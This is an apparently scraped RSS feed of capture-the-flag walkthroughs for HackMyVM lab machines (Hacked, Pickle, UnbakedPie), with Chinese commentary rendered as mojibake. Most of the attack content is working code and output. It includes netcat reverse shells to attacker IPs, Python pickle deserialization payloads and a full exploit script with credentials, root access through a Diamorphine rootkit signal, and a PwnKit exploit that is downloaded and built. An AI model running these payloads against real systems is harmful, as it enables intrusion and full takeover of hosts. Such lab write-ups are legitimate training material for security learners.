â””â”€# ffuf -u http://192.168.42.185/simple-backdoor.php?FUZZ=id -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt |grep -v "Size: 62"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.42.185/simple-backdoor.php?FUZZ=id
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

secret                  [Status: 302, Size: 115, Words: 12, Lines: 2, Duration: 19ms]
<br>è·å–åˆ°å‚æ•°æ˜¯ secret ä¹‹å‰æœ‰åœ¨ç½‘é¡µè¯•è¿‡è¿™ä¸ªå‚æ•°ã€‚åº”è¯¥æ˜¯302äº†å¯¼è‡´æ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥<br>
æŠ“åŒ…çš„è¯å¯ä»¥çœ‹åˆ°<br>
<img alt="Pasted image 20241201183435" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201183435.png" referrerpolicy="no-referrer"><br>å¼¹shell<br>nc -e /bin/bash 192.168.42.39 1111
nc%20-e%20%2Fbin%2Fbash%20192.168.42.39%201111
<br>[18:42:48] Welcome to pwncat ğŸˆ!                                                              __main__.py:164
[18:46:34] received connection from 192.168.42.185:36606                                           bind.py:84
[18:46:35] 192.168.42.185:36606: registered new host w/ db                                     manager.py:957
(local) pwncat$
(remote) www-data@hacked:/var/www/html$ whoami
www-data
(remote) www-data@hacked:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
(remote) www-data@hacked:/var/www/html$
<br><br>è¿™é¶æœºä¸Šgccç¼–è¯‘ä¸äº†ã€‚æ‰¾ä¸åˆ°Ld<br>
å¯ä»¥å°è¯•ä»å…¶ä»–ç‰ˆæœ¬ç›¸è¿‘çš„é¶æœºç¼–è¯‘åä¼ è¿‡æ¥ã€‚<br>
è¿™é‡Œæˆ‘å°±ä¸å°è¯•äº†<br>ä½¿ç”¨linpeasè¿›è¡Œæ£€æµ‹ã€‚ä¹Ÿæ²¡æœ‰å‘ç°ä»€ä¹ˆåˆ©ç”¨ç‚¹<br>å»çœ‹ä¸€ä¸‹wpæ‰å‘ç°åŸæ¥è¿™é‡Œå­˜åœ¨Rootkit<br>
<a rel="noopener nofollow" class="external-link" href="https://github.com/m0nad/Diamorphine" target="_blank">https://github.com/m0nad/Diamorphine</a><br>kill -63 0 å–æ¶ˆéšè—è¿›ç¨‹
lsmod åˆ—å‡ºåŠ è½½åˆ°å†…æ ¸ä¸­çš„æ¨¡å—
<br><img alt="Pasted image 20241201193026" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201193026.png" referrerpolicy="no-referrer"><br>
å¯ä»¥çœ‹åˆ°ç¡®å®å®‰è£…äº†<a data-tooltip-position="top" aria-label="../../26-å·¥å…·ä½¿ç”¨/Diamorphineä½¿ç”¨" data-href="../../26-å·¥å…·ä½¿ç”¨/Diamorphineä½¿ç”¨" href="https://www.c1trus.top/26-å·¥å…·ä½¿ç”¨/diamorphineä½¿ç”¨.html" class="internal-link" target="_self" rel="noopener nofollow">Diamorphine</a> <br><a data-tooltip-position="top" aria-label="../../26-å·¥å…·ä½¿ç”¨/Diamorphineä½¿ç”¨" data-href="../../26-å·¥å…·ä½¿ç”¨/Diamorphineä½¿ç”¨" href="https://www.c1trus.top/26-å·¥å…·ä½¿ç”¨/diamorphineä½¿ç”¨.html" class="internal-link" target="_self" rel="noopener nofollow">æµ·æ´›å› </a>æœ‰ä¸€ä¸ªç‰¹å¾<br>
<img alt="Pasted image 20241201193108" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201193108.png" referrerpolicy="no-referrer"><br>
æˆ‘ä»¬å‘é€ä¿¡å·64å³å¯è·å–åˆ°root<br>(remote) www-data@hacked:/tmp$ kill -64 0
(remote) root@hacked:/tmp$ id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
<br>
(remote) root@hacked:/root$ sh flag.sh

                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,
-------------------------

PWNED HOST: hacked

PWNED DATE: Sun Dec  1 06:32:33 EST 2024

WHOAMI: uid=0(root) gid=0(root) groups=0(root),33(www-data)

FLAG: HMVhackingthehacker

------------------------


remote) root@hacked:/home/h4x0r$ sh flag.sh

                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,
-------------------------

PWNED HOST: hacked

PWNED DATE: Sun Dec  1 06:32:55 EST 2024

WHOAMI: uid=0(root) gid=0(root) groups=0(root),33(www-data)

FLAG: HMVimthabesthacker

------------------------

]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/34.hacked.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/34.hacked.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201183435.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201183435.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[33.pickle]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. ftp" data-href="#3. ftp" href="https://www.c1trus.top/about:blank#3._ftp" class="internal-link" target="_self" rel="noopener nofollow">3. ftp</a>
<br><a data-tooltip-position="top" aria-label="4. SNMPæœåŠ¡åˆ©ç”¨" data-href="#4. SNMPæœåŠ¡åˆ©ç”¨" href="https://www.c1trus.top/about:blank#4._SNMPæœåŠ¡åˆ©ç”¨" class="internal-link" target="_self" rel="noopener nofollow">4. SNMPæœåŠ¡åˆ©ç”¨</a>

<br><a data-tooltip-position="top" aria-label="4.1. snmpbulkwalk è·å–æ•°æ®" data-href="#4.1. snmpbulkwalk è·å–æ•°æ®" href="https://www.c1trus.top/about:blank#4.1._snmpbulkwalk_è·å–æ•°æ®" class="internal-link" target="_self" rel="noopener nofollow">4.1. snmpbulkwalk è·å–æ•°æ®</a>


<br><a data-tooltip-position="top" aria-label="5. Pickleååºåˆ—åŒ–" data-href="#5. Pickleååºåˆ—åŒ–" href="https://www.c1trus.top/about:blank#5._Pickleååºåˆ—åŒ–" class="internal-link" target="_self" rel="noopener nofollow">5. Pickleååºåˆ—åŒ–</a>
<br><a data-tooltip-position="top" aria-label="6. PwnKitææƒ" data-href="#6. PwnKitææƒ" href="https://www.c1trus.top/about:blank#6._PwnKitææƒ" class="internal-link" target="_self" rel="noopener nofollow">6. PwnKitææƒ</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Pickle" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Pickle</a><br>
ä½œè€… <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=0xEEX75" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=0xEEX75" target="_blank">0xEEX75</a><br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸
<br><br>
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# fscan -h 192.168.80.7 -p 1-65535

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.80.7:21 open
192.168.80.7:1337 open
[*] alive ports len is: 2
start vulscan
[*] WebTitle http://192.168.80.7:1337  code:401 len:90     title:None
[+] ftp 192.168.80.7:21:anonymous
   [-&gt;]init.py.bak
å·²å®Œæˆ 2/2
[*] æ‰«æç»“æŸ,è€—æ—¶: 1.329781452s

<br><br>
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/pickle]
â””â”€# ftp 192.168.80.7
Connected to 192.168.80.7.
220 (vsFTPd 3.0.3)
Name (192.168.80.7:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||7642|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Oct 12  2020 .
drwxr-xr-x    2 0        0            4096 Oct 12  2020 ..
-rwxr-xr-x    1 0        0            1306 Oct 12  2020 init.py.bak
226 Directory send OK.
ftp&gt; get init.py.bak
local: init.py.bak remote: init.py.bak
229 Entering Extended Passive Mode (|||31068|)
150 Opening BINARY mode data connection for init.py.bak (1306 bytes).
100% |************************************************************|  1306      116.72 KiB/s    00:00 ETA
226 Transfer complete.
1306 bytes received in 00:00 (113.68 KiB/s)
ftp&gt; exit
221 Goodbye.

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/pickle]
â””â”€# ls
init.py.bak
<br>init.py<br>from functools import wraps
from flask import *
import hashlib
import socket
import base64
import pickle
import hmac

app = Flask(__name__, template_folder="templates", static_folder="/opt/project/static/")

@app.route('/', methods=["GET", "POST"])
def index_page():
        '''
                __index_page__()
        '''
        if request.method == "POST" and request.form["story"] and request.form["submit"]:
                md5_encode = hashlib.md5(request.form["story"]).hexdigest()
                paths_page  = "/opt/project/uploads/%s.log" %(md5_encode)
                write_page = open(paths_page, "w")
                write_page.write(request.form["story"])

                return "The message was sent successfully!"

        return render_template("index.html")

@app.route('/reset', methods=["GET", "POST"])
def reset_page():
        '''
                __reset_page__()
        '''
        pass


@app.route('/checklist', methods=["GET", "POST"])
def check_page():
        '''
                __check_page__()
        '''
        if request.method == "POST" and request.form["check"]:
                path_page    = "/opt/project/uploads/%s.log" %(request.form["check"])
                open_page    = open(path_page, "rb").read()
                if "p1" in open_page:
                        open_page = pickle.loads(open_page)
                        return str(open_page)
                else:
                        return open_page
        else:
                return "Server Error!"

        return render_template("checklist.html")

if __name__ == '__main__':
        app.run(host='0.0.0.0', port=1337, debug=True)

<br>çœ‹ä¸€ä¸‹ç½‘é¡µ<br><img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241130215126.png" referrerpolicy="no-referrer"><br>
Gptåˆ†æ<br>
<img alt="585" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241130215318.png" referrerpolicy="no-referrer"><br>
ä¸»è¦æ¼æ´å°±æ˜¯åœ¨ / ä¸ /checklist è·¯ç”±ä¸Š<br>
æäº¤çš„æ–‡ä»¶å†…å®¹å¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶<br>
ååºåˆ—åŒ–p1çš„å†…å®¹ä¹Ÿå¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶
<br><br>æˆ‘ä»¬ç›®å‰è®¿é—®ä¸äº†è¿™ä¸ªè·¯ç”±ã€‚å› ä¸ºæœ‰éªŒè¯<br>
è¿™æ—¶å€™å¯ä»¥å°è¯•ä¸€ä¸‹æ‰«æudpåè®®<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/pickle]
â””â”€# nmap -sU 192.168.80.7 --top-ports 20
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-30 22:25 CST
Nmap scan report for 192.168.80.7
Host is up (0.00024s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   open|filtered ntp
135/udp   closed        msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   closed        netbios-ssn
161/udp   open          snmp
162/udp   closed        snmptrap
445/udp   open|filtered microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp open|filtered unknown
MAC Address: 08:00:27:8B:9A:A4 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 8.04 seconds

<br>å¯ä»¥å‘ç° snmpæœåŠ¡ æ˜¯å¼€æ”¾çš„<br>
snmpçš„ç›¸å…³ä¿¡æ¯å¯ä»¥<a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/cn/network-services-pentesting/pentesting-snmp" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/cn/network-services-pentesting/pentesting-snmp" target="_blank">åœ¨è¿™é‡Œ</a>æŸ¥çœ‹<br><img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241130224842.png" referrerpolicy="no-referrer"><br>
snmpçš„åˆ©ç”¨å¯ä»¥é€šè¿‡æš´åŠ›ç ´è§£ç¤¾åŒºå­—ç¬¦ä¸²ï¼ˆcommunity stringï¼‰ï¼Œå…¶ä¸­æœ€å¸¸è§çš„ç¤¾åŒºå­—ç¬¦ä¸²æ˜¯ public<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/pickle]
â””â”€# snmpbulkwalk -c public -v2c 192.168.80.7 .
Created directory: /var/lib/snmp/cert_indexes
iso.3.6.1.2.1.1.1.0 = STRING: "Linux pickle 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (415838) 1:09:18.38
iso.3.6.1.2.1.1.4.0 = STRING: "lucas:SuperSecretPassword123!"
iso.3.6.1.2.1.1.5.0 = STRING: "pickle"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (5) 0:00:00.05
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
<br>é‡Œé¢å¯ä»¥çœ‹åˆ°ä¸€ä¸ªåƒæ˜¯è´¦å·å¯†ç çš„ä¸œè¥¿<br>
lucas:SuperSecretPassword123!<br>å°è¯•ä¸€ä¸‹ å‘ç°ç¡®å®æ˜¯è´¦å·å¯†ç <br>
åˆ©ç”¨è´¦å·å¯†ç æˆåŠŸé€šè¿‡è®¤è¯<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241130225142.png" referrerpolicy="no-referrer"><br><br>åœ¨ / è·¯ç”±ä¸‹ å‘é€ååºåˆ—åŒ–çš„payload<br>
ç„¶ååœ¨ /checklist è·¯ç”±ä¸‹postä¼ å‚ check å€¼ä¸ºæˆ‘ä»¬payloadçš„md5<br>import pickle, os, base64
	class P(object):
		def __reduce__(self):
			return (os.system,("nc -e /bin/bash 192.168.80.5 1234 ",))
print(pickle.dumps(P()))
<br>Warning
è¿™é‡Œå¿…é¡»ç”¨Python2ç”Ÿæˆpayload
<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/pickle]
â””â”€# python2 payload.py
cposix
system
p0
(S'nc -e /bin/bash 192.168.80.5 1234 '
p1
tp2
Rp3
.
<br>è¿™é‡Œæœ‰ä¸€ä¸ªbugã€‚å°±æ˜¯å®ƒæ¥æ”¶ä½ çš„payloadåç”Ÿæˆçš„md5ä¸ä½ è‡ªå·±è®¡ç®—çš„md5ä¸åŒ<br>
åŸå› åº”è¯¥æ˜¯ç³»ç»Ÿçš„é—®é¢˜<br>
è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨å®ƒç»™çš„md5è®¡ç®—æ–¹æ³•è®¡ç®—md5<br>
å¦‚æœæˆ‘ä»¬è¦è·å–æ­£ç¡®çš„md5 é€‰æ‹©è½¬ä¸ºunixå³å¯ ç„¶åå†è®¡ç®—å³å¯<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201001719.png" referrerpolicy="no-referrer"><br>#coding:utf-8
import os
import cPickle
import hashlib
import requests


class CommandExecute(object):
        def __reduce__(self):
                return (os.system, ('nc 192.168.80.5 1234 -e /bin/bash',))

convert_data = cPickle.dumps(CommandExecute())
convert_crypt = hashlib.md5(convert_data).hexdigest()
print("md5:"+convert_crypt)
print("convert_data:"+convert_data)
send_requests = requests.post('http://192.168.80.7:1337/', data={"story":convert_data, "submit":"Submit+Query"}, auth=("lucas", "SuperSecretPassword123!"))
check_requests = requests.post('http://192.168.80.7:1337/checklist', data={"check":convert_crypt}, auth=("lucas", "SuperSecretPassword123!"))
print(check_requests.text)

<br>ç›‘å¬ 1234 ç«¯å£è·å–shell<br>curl -u 'lucas:SuperSecretPassword123!' --basic http://192.168.80.7:1337/checklist -X POST --data 'check=f387dc63759af1e92868d3556f63ed9e'
<br><br>ä½¿ç”¨<a data-tooltip-position="top" aria-label="../../26-å·¥å…·ä½¿ç”¨/LZSä½¿ç”¨" data-href="../../26-å·¥å…·ä½¿ç”¨/LZSä½¿ç”¨" href="https://www.c1trus.top/26-å·¥å…·ä½¿ç”¨/lzsä½¿ç”¨.html" class="internal-link" target="_self" rel="noopener nofollow">LZS</a> è¿›è¡Œæ£€æµ‹<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201004318.png" referrerpolicy="no-referrer"><br>wget https://codeload.github.com/berdav/CVE-2021-4034/zip/main
unzip main
cd CVE-2021-4034-main
make
./cve-2021-4034
<br>e25fd1b9248d1786551e3412adc74f6f
7a32c9739cc63ed983ae01af2577c01c
<br>æœ€åçœ‹ä¸€ä¸‹å®Œæ•´çš„ project.py<br>app = Flask(__name__, template_folder="templates", static_folder="/opt/project/static/")

def check_auth(username, password):
       """This function is called to check if a username /
       password combination is valid.
       """
       return username == 'lucas' and password == 'SuperSecretPassword123!'

def authenticate():
       """Sends a 401 response that enables basic auth"""
       return Response(
       'Could not verify your access level for that URL.\n'
       'You have to login with proper credentials', 401,
       {'WWW-Authenticate': 'Basic realm="Pickle login"'})

def requires_auth(f):
       @wraps(f)
       def decorated(*args, **kwargs):
           auth = request.authorization
           if not auth or not check_auth(auth.username, auth.password):
               return authenticate()
           return f(*args, **kwargs)
       return decorated

@app.route('/', methods=["GET", "POST"])
@requires_auth
def index_page():
        '''
                __index_page__()
        '''
        if request.method == "POST" and request.form["story"] and request.form["submit"]:
                md5_encode = hashlib.md5(request.form["story"]).hexdigest()
                paths_page  = "/opt/project/uploads/%s.log" %(md5_encode)
                write_page = open(paths_page, "w")
                write_page.write(request.form["story"])

                return "The message was sent successfully!"

        return render_template("index.html")

@app.route('/reset', methods=["GET", "POST"])
@requires_auth
def reset_page():
        '''
                __reset_page__()
        '''
        if request.method == "POST" and request.form["username"] and request.form["key"]:
                key    = "dpff43f3p214k31301"
                raw    = request.form["username"] + key + socket.gethostbyname(socket.gethostname())
                hashed = hmac.new(key, raw, hashlib.sha1)
                if request.form["key"] == hashed.hexdigest():
                        return base64.b64encode(hashed.digest().encode("base64").rstrip("\n"))
        else:
                return "Server Error!"
        return render_template("reset.html")


@app.route('/checklist', methods=["GET", "POST"])
@requires_auth
def check_page():
        '''
                __check_page__()
        '''
        if request.method == "POST" and request.form["check"]:
                path_page    = "/opt/project/uploads/%s.log" %(request.form["check"])
                open_page    = open(path_page, "rb").read()
                if "p1" in open_page:
                        open_page = pickle.loads(open_page)
                        return str(open_page)
                else:
                        return open_page
        else:
                return "Server Error!"

        return render_template("checklist.html")

@app.route('/console')
@requires_auth
def secret_page():
        return "Server Error!"

if __name__ == '__main__':
        app.run(host='0.0.0.0', port=1337, debug=True)

]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/33.pickle.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/33.pickle.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241130215126.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241130215126.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[32.UnbakedPie]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. pythonååºåˆ—åŒ–" data-href="#3. pythonååºåˆ—åŒ–" href="https://www.c1trus.top/about:blank#3._pythonååºåˆ—åŒ–" class="internal-link" target="_self" rel="noopener nofollow">3. pythonååºåˆ—åŒ–</a>
<br><a data-tooltip-position="top" aria-label="4. dockeré€ƒé€¸&amp;ææƒ" data-href="#4. dockeré€ƒé€¸&amp;ææƒ" href="https://www.c1trus.top/about:blank#4._dockeré€ƒé€¸&amp;ææƒ" class="internal-link" target="_self" rel="noopener nofollow">4. dockeré€ƒé€¸&amp;ææƒ</a>
<br><a data-tooltip-position="top" aria-label="5. ç«¯å£è½¬å‘ ä¸SSHçˆ†ç ´" data-href="#5. ç«¯å£è½¬å‘ ä¸SSHçˆ†ç ´" href="https://www.c1trus.top/about:blank#5._ç«¯å£è½¬å‘_ä¸SSHçˆ†ç ´" class="internal-link" target="_self" rel="noopener nofollow">5. ç«¯å£è½¬å‘ ä¸SSHçˆ†ç ´</a>

<br>[[#5.1. <a data-tooltip-position="top" aria-label="../../26-å·¥å…·ä½¿ç”¨/chisel ä½¿ç”¨" data-href="../../26-å·¥å…·ä½¿ç”¨/chisel ä½¿ç”¨" href="https://www.c1trus.top/26-å·¥å…·ä½¿ç”¨/chisel-ä½¿ç”¨.html" class="internal-link" target="_self" rel="noopener nofollow">chisel</a> æ­å»ºç«¯å£è½¬å‘|5.1. <a data-tooltip-position="top" aria-label="../../26-å·¥å…·ä½¿ç”¨/chisel ä½¿ç”¨" data-href="../../26-å·¥å…·ä½¿ç”¨/chisel ä½¿ç”¨" href="https://www.c1trus.top/26-å·¥å…·ä½¿ç”¨/chisel-ä½¿ç”¨.html" class="internal-link" target="_self" rel="noopener nofollow">chisel</a> æ­å»ºç«¯å£è½¬å‘]]
<br><a data-tooltip-position="top" aria-label="5.2. hydraçˆ†ç ´å¯†ç " data-href="#5.2. hydraçˆ†ç ´å¯†ç " href="https://www.c1trus.top/about:blank#5.2._hydraçˆ†ç ´å¯†ç " class="internal-link" target="_self" rel="noopener nofollow">5.2. hydraçˆ†ç ´å¯†ç </a>


<br><a data-tooltip-position="top" aria-label="6. ææƒ" data-href="#6. ææƒ" href="https://www.c1trus.top/about:blank#6._ææƒ" class="internal-link" target="_self" rel="noopener nofollow">6. ææƒ</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=UnbakedPie" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=UnbakedPie</a><br>
ä½œè€… <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=ch4rm" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=ch4rm" target="_blank">ch4rm</a><br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/UnbakedPie]
â””â”€# nmap -sS 192.168.56.27 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-28 17:53 CST

Nmap scan report for 192.168.56.27
Host is up (0.0010s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE
5003/tcp open  filemaker
MAC Address: 08:00:27:10:44:F1 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 959.54 seconds
<br>ç½‘ç«™<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241128182147.png" referrerpolicy="no-referrer"><br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241128183615.png" referrerpolicy="no-referrer"><br>Server WSGIServer/0.2 CPython/3.8.6<br>
Pythonå†™çš„<br>ä¸Šé¢æœ‰ä¸€ä¸ªæœç´¢æ¡†<br>
æŠ“åŒ…çœ‹çœ‹æ•°æ®<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241128202309.png" referrerpolicy="no-referrer"><br>
gA å¼€å¤´ ä¸€çœ¼ <a class="internal-link" data-href="../../20-ç½‘å®‰/21-CTF/python/pythonååºåˆ—åŒ–.md" href="https://www.c1trus.top/20-ç½‘å®‰/21-ctf/python/pythonååºåˆ—åŒ–.html" target="_self" rel="noopener nofollow">pythonååºåˆ—åŒ–</a><br>å¯¹è¿™ä¸ªè¿›è¡Œè§£ç çœ‹ä¸€ä¸‹<br>import base64
a='gASVCgAAAAAAAACMBjEyMzEyM5Qu'
print(base64.b64decode(a))

è¾“å‡º
b'\x80\x04\x95\n\x00\x00\x00\x00\x00\x00\x00\x8c\x06123123\x94.'
<br>import pickle

p = b'\x80\x04\x95\n\x00\x00\x00\x00\x00\x00\x00\x8c\x06123123\x94.'
d = pickle.loads(p)
print(d)

è¾“å‡º
123123
<br><br>123123å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„æ˜æ–‡æœç´¢å†…å®¹<br>é‚£æˆ‘ä»¬ç›´æ¥æ„å»ºä¸€ä¸ªåå¼¹shellçš„payload<br><img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241128230329.png" referrerpolicy="no-referrer"><br>import pickle, os, base64
class P(object):
    def __reduce__(self):
        return (os.system,("nc -e /bin/bash 192.168.80.5 1111 ",))
print(base64.b64encode(pickle.dumps(P())))

è¾“å‡ºï¼š
gASVPQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCJuYyAtZSAvYmluL2Jhc2ggMTkyLjE2OC44MC41IDExMTEglIWUUpQu
<br>Warning
è¿™é‡Œä¸€å®šè¦ç”¨Linuxç”Ÿæˆpayloadï¼Œå› ä¸ºå…¶ä½¿ç”¨äº† os.system è¿™ä¸ªå‡½æ•°åœ¨linuxä¸windowsæœ‰æ‰€ä¸åŒã€‚æ‰€ä»¥è¦ä¸é¶æœºçš„ç³»ç»Ÿç›¸åŒã€‚ä½¿ç”¨Linuxç”Ÿæˆpayload
<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/UnbakedPie]
â””â”€# python payload.py
b'gASVPQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCJuYyAtZSAvYmluL2Jhc2ggMTkyLjE2OC44MC41IDExMTEglIWUUpQu'

<br>ç„¶ååœ¨è¿™ä¸ªä½ç½®éšä¾¿æœç´¢ä¸€ä¸‹ã€‚æŠ“ä¸ªåŒ…æ›¿æ¢æ‰ search_cookie<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201120622.png" referrerpolicy="no-referrer"><br>
